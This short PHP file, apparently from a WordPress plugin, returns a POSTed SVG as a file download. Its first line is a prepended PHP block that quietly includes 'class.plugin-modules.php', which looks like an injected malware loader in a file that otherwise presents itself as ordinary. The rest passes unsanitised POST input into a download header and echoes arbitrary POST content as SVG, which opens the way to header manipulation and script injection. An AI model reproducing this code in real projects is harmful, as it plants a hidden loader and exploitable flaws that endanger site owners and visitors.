<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
header('Content-type: image/svg+xml');
header("Content-Disposition: attachment; filename=".$_POST['svg_title'].".svg");
echo $_POST['svg_file'];
?>